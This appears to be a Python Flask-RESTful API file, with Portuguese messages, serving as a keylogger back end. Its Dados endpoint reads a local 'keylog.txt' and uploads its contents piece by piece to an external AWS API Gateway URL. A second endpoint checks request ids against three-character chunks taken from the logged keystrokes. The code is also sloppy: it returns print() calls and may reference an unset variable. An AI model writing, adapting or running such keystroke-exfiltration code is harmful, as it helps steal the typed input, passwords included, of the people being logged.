from flask_restful import Resource
import requests
import os

txt = []

class Dados(Resource):
    def get(self):
        url = "https://syvebgth72.execute-api.us-east-1.amazonaws.com/api/upload/keylog.txt"
        arq = "./upload/keylog.txt"
        ax = ''
        verificando = os.path.abspath(arq)
        if os.path.exists(verificando):
            with open(verificando, "rb") as arquivo:
                a = arquivo.read().split()
                for aa in a:
                    diretorio = requests.put(url, data=aa, headers={"Content-Type": "application/octet-stream"})

            with open(verificando, "r") as ark:
                a = ark.read()
            for x in a:
                if x == '\n' or x == ' ':
                    pass
                else:
                    ax += x  
                    if len(ax) == 3:
                        txt.append(ax)
                        ax =''
                
            if diretorio.status_code == 200:
                return txt, print("Upload bem-sucedido!")
            else:
                return print("Erro ao fazer upload:", diretorio.text)
        else:
            return print('Arquivo não encontrado')
            

class processo(Resource):
    def get(self, id):
        ad = ''
        for ct,ver in enumerate(id):
            if ct == 1 or ct == 2 or ct == 4:
                ad += ver
        if ad in txt:
            return ad
        return 'Unauthorized - Não autorizado', 401
